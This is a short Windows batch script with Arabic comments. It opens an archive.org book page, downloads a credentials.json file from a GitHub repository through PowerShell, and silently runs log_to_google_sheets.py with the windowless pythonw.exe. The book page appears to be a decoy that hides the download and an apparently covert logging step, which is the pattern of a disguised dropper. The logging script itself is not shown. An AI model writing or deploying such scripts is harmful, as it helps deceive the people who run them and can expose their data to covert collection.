@echo off
:: فتح الكتاب
start "" "https://archive.org/details/latiatulanovela00unam/mode/2up?ref=ol&view=theater"

:: تنزيل ملف credentials.json
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/lolohole/my-front-end/raw/main/credentials.json', 'credentials.json')"

:: تشغيل سكريبت البايثون
pythonw.exe log_to_google_sheets.py

